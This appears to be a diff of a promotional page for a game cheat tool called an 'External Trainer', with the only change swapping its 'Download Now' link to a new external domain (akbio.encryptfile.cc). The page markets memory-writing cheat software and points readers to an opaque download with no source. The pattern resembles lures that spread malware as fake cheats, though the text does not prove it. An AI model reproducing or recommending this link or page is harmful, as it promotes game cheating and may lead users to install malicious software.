@@ -4,7 +4,7 @@ After the March 19 2026 update I tested 8–12 different External Trainer builds
 
 The External Trainer is delivered as a clean usermode process with a lightweight ImGui overlay. It attaches read-only wherever possible and performs minimal targeted writes only to verified pointers. CPU usage stays consistently below 4 % even with every visual and utility feature active. I maintain a strict solo/private policy: all testing is done on private islands or solo dungeon instances to keep the technical footprint minimal and avoid any interaction with other players.
 
-<a href="https://akbio.git-blox.com/" target="_blank" rel="noopener"><img src="https://i.pinimg.com/originals/4f/ef/a6/4fefa69a6b6dc356246858050ac41d47.png" alt="Download Now"></a>
+<a href="https://akbio.encryptfile.cc/" target="_blank" rel="noopener"><img src="https://i.pinimg.com/originals/4f/ef/a6/4fefa69a6b6dc356246858050ac41d47.png" alt="Download Now"></a>
 
 **Memory Reality Check After March 19**
 
